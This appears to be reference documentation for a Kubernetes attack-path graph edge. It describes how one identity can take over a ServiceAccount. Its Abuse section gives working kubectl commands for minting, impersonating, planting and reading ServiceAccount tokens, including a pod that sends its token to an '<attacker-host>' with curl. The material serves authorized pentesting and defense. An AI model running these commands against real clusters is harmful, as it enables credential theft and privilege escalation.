# CH_canAssumeServiceAccount

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Identity](../NodeDescriptions/CH_Identity.md)

## General Information

The source Identity can authenticate as the target ServiceAccount by abusing a namespace- or cluster-scoped permission it holds over that ServiceAccount's namespace. This is a derived edge: it collapses several distinct assumption mechanisms into a single traversable Identity-to-Identity hop, so multi-step "become this SA, which can become that SA" chains surface in pathfinding (e.g. `shortestPath`, `*1..n`) instead of dead-ending at a namespace node.

## Edge Properties

| Property | Description |
|----------|-------------|
| via | Comma-separated list of the mechanism(s) that grant the assumption (see below). Multiple mechanisms to the same target are merged into one edge. |

The `via` values:

- `createWorkload` — create a Pod or pod-creating workload (Deployment, StatefulSet, DaemonSet, ReplicaSet, ReplicationController, Job, CronJob) with `serviceAccountName` set to the target.
- `patchWorkload` — modify a mutable-template workload (Deployment, StatefulSet, DaemonSet, ReplicaSet, ReplicationController, CronJob) to repoint its pod template at the target. Excludes bare Pods (`serviceAccountName` immutable once scheduled) and Jobs (`spec.template` immutable after creation).
- `createToken` — request a token for the target via the TokenRequest API (`create` on `serviceaccounts/token`).
- `impersonate` — impersonate the target with `--as`.
- `tokenSecretPlant` — `create` plus `get`/`list` on secrets in scope: plant a `kubernetes.io/service-account-token` Secret annotated for the target, let the controller mint the token, then read it back.
- `tokenSecretRead` — `get`/`list` on secrets where a `kubernetes.io/service-account-token` Secret already exists for the target.
- `fullAccess` — namespace-scoped wildcard, which subsumes all of the above for SAs in that namespace.

This edge is **not** emitted for `canExec`, `canCreateEphemeral`, `canAttach`, or `canPortForward`: those reach only the ServiceAccount of a specific *running* pod, which is already represented accurately by [CH_mountsServiceAccount](CH_mountsServiceAccount.md) on that pod. It is likewise not emitted for `canBind`/`canEscalate`, which escalate privileges by other means and do not directly yield a ServiceAccount identity. Cluster-wide wildcard (`fullAccess` to the Cluster) is intentionally excluded as a source — it is already terminal, and would fan out to every ServiceAccount in the cluster for no additional pathfinding value.

## Realising the Assumption

How directly the edge yields the target identity depends on the `via` mechanism, and the workload-based mechanisms carry preconditions the operator does not control.

`createToken`, `impersonate`, `tokenSecretPlant`, and `tokenSecretRead` yield the identity **directly** — a token from the API, an `--as` request, or a token read from a Secret — with no pod required. These are the cleanest paths.

`createWorkload` and `patchWorkload` instead place a pod *running as* the target SA, so the assumption is only realised by either acting from inside that pod or getting its mounted token out. Each route has its own conditions:

- **Act from within the pod** (most self-contained): the pod is already running as the SA, so a malicious image/command calls the in-cluster API directly. Requires the pod to actually schedule — i.e. not rejected by Pod Security Admission, Gatekeeper/Kyverno, resource quotas, or image-pull/registry policy — and API reachability from the pod (normally available in-cluster, but a NetworkPolicy can restrict egress). Needs no extra RBAC.
- **Self-exfiltrate the token** to external infrastructure: requires egress to be permitted (NetworkPolicy / egress firewall) and attacker-controlled infrastructure to receive it.
- **Read it via `pods/log`**: requires the separate `pods/log` permission and the token written to stdout.
- **Exec in and read it**: requires the separate `pods/exec` permission.

So `createWorkload`/`patchWorkload` are sufficient on their own in a permissive cluster (act-from-within), but hardened environments — restrictive admission control, blocked egress, image-pull constraints, no shell-capable image available — may force a fallback that needs an additional permission such as `pods/exec` or `pods/log`. This edge represents the assumption *capability*; the viable realisation route should be confirmed during exploitation.

## Abuse

Confirm the assumption path indicated by the `via` property, act as the target ServiceAccount, then enumerate its permissions to continue the chain.

```bash
# via=createToken — request a token directly (TokenRequest API)
kubectl create token <target-sa> -n <namespace>

# via=impersonate — act as the target without any token
kubectl auth can-i --list \
  --as=system:serviceaccount:<namespace>:<target-sa>

# via=createWorkload — run a pod AS the target SA. No exec needed: the pod is
# already that identity. Here it self-exfiltrates its token (needs egress); it
# could equally run kubectl from inside against the in-cluster API.
kubectl run pwn -n <namespace> --image=curlimages/curl --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"<target-sa>"}}' \
  -- sh -c 'curl -s --data-binary @/var/run/secrets/kubernetes.io/serviceaccount/token http://<attacker-host>/'
# (other retrieval routes: kubectl exec [needs pods/exec], kubectl logs [needs pods/log])

# via=patchWorkload — repoint a mutable workload's pod template at the target SA.
# The controller rolls out a new pod running as <target-sa>; read its token.
kubectl patch deployment <name> -n <namespace> --type=strategic \
  -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'

# via=tokenSecretPlant — create a token Secret for the target, let the controller
# populate it, then read the minted token back (needs create + get on secrets)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: minted
  namespace: <namespace>
  annotations:
    kubernetes.io/service-account.name: <target-sa>
type: kubernetes.io/service-account-token
EOF
kubectl get secret minted -n <namespace> \
  -o jsonpath='{.data.token}' | base64 -d

# via=tokenSecretRead — read an existing token Secret already bound to the target
kubectl get secret <target-sa-token-secret> -n <namespace> \
  -o jsonpath='{.data.token}' | base64 -d

# Enumerate the assumed identity's permissions to plan the next hop
kubectl auth can-i --list \
  --as=system:serviceaccount:<namespace>:<target-sa>
```

## References

- [Kubernetes TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
- [Kubernetes User Impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)
- [Kubernetes ServiceAccount Tokens](https://kubernetes.io/docs/concepts/security/service-accounts/)
- [HackTricks - Abusing Roles/ClusterRoles in Kubernetes](https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes/index.html)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
